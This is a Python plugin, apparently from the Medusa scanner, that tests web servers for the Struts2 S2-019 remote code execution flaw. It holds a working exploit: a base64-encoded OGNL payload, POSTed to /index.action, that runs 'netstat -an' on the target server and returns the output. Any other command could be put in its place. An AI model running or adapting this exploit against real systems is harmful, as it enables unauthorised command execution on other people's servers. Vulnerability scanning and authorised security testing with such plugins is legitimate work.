#!/usr/bin/env python
# -*- coding: utf-8 -*-
import base64
import requests
from Modules.Struts2.CriticalResult import Result
from ClassCongregation import VulnerabilityDetails,UrlProcessing,ErrorLog,WriteFile,ErrorHandling,Proxies
class VulnerabilityInfo(object):
    def __init__(self,Medusa):
        self.info = {}
        self.info['number']="0" #如果没有CVE或者CNVD编号就填0，CVE编号优先级大于CNVD
        self.info['author'] = "Ascotbe"  # 插件作者
        self.info['create_date'] = "2020-3-14"  # 插件编辑时间
        self.info['disclosure']='2020-3-11'#漏洞披露时间，如果不知道就写编写插件的时间
        self.info['algroup'] = "Struts2RemoteCodeExecutionVulnerability19"  # 插件名称
        self.info['name'] ='Struts2远程代码执行漏洞19' #漏洞名称
        self.info['affects'] = "Struts2"  # 漏洞组件
        self.info['desc_content'] = "0"  # 漏洞描述
        self.info['rank'] = "高危"  # 漏洞等级
        self.info['suggest'] = "尽快升级最新系统"  # 修复建议
        self.info['version'] = "0"  # 这边填漏洞影响的版本
        self.info['details'] = Medusa  # 结果


def medusa(Url,RandomAgent,proxies=None,**kwargs):
    proxies=Proxies().result(proxies)

    scheme, url, port = UrlProcessing().result(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    data=base64.b64decode("ZGVidWc9Y29tbWFuZCZleHByZXNzaW9uPSNmPSNfbWVtYmVyQWNjZXNzLmdldENsYXNzKCkuZ2V0RGVjbGFyZWRGaWVsZCgnYWxsb3dTdGF0aWNNZXRob2RBY2Nlc3MnKSwjZi5zZXRBY2Nlc3NpYmxlKHRydWUpLCNmLnNldCgjX21lbWJlckFjY2Vzcyx0cnVlKSwjcmVxPUBvcmcuYXBhY2hlLnN0cnV0czIuU2VydmxldEFjdGlvbkNvbnRleHRAZ2V0UmVxdWVzdCgpLCNyZXNwPUBvcmcuYXBhY2hlLnN0cnV0czIuU2VydmxldEFjdGlvbkNvbnRleHRAZ2V0UmVzcG9uc2UoKS5nZXRXcml0ZXIoKSwjYT0obmV3IGphdmEubGFuZy5Qcm9jZXNzQnVpbGRlcihuZXcgamF2YS5sYW5nLlN0cmluZ1tdeyduZXRzdGF0JywnLWFuJ30pKS5zdGFydCgpLCNiPSNhLmdldElucHV0U3RyZWFtKCksI2M9bmV3IGphdmEuaW8uSW5wdXRTdHJlYW1SZWFkZXIoI2IpLCNkPW5ldyBqYXZhLmlvLkJ1ZmZlcmVkUmVhZGVyKCNjKSwjZT1uZXcgY2hhclsxMDAwMF0sI2QucmVhZCgjZSksI3Jlc3AucHJpbnRsbigjZSksI3Jlc3AuY2xvc2UoKQ==")
    try:
        payload_url = scheme + "://" + url +":"+ str(port)+"/index.action"
        headers = {
            'User-Agent': RandomAgent,
            "Accept": "application/x-shockwave-flash, image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*",
            "Content-Type": "application/x-www-form-urlencoded"
        }

        resp = requests.post(payload_url,headers=headers,data=data, proxies=proxies,timeout=6, verify=False)
        con = resp.text
        resilt=Result(con)
        if resilt=="Linux" or resilt=="NoteOS" or resilt=="Windows":
            Medusa = "{} 存在Struts2远程代码执行漏洞\r\n漏洞详情:\r\n版本号:S2-019\r\n返回数据:{}\r\n部署系统:{}\r\n".format(url,con,resilt)
            _t=VulnerabilityInfo(Medusa)
            VulnerabilityDetails(_t.info, url,**kwargs).Write()  # 传入url和扫描到的数据
            WriteFile().result(str(url),str(Medusa))#写入文件，url为目标文件名统一传入，Medusa为结果
    except Exception as e:
        _ = VulnerabilityInfo('').info.get('algroup')
        ErrorHandling().Outlier(e, _)
        _l = ErrorLog().Write("Plugin Name:"+_+" || Target Url:"+url,e)#调用写入类